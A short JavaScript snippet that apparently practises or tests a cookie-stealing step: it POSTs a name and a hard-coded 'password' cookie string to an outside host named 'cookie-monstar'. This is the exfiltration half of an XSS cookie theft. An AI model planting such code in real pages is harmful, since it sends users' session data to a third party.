var url = "https://cookie-monstar.herokuapp.com/";
var name = 'Abu Huraira'
var cookie = 'password=1234567890'
var params = "name="+name+"&cookie="+cookie;
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);

//Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

xhr.send(params);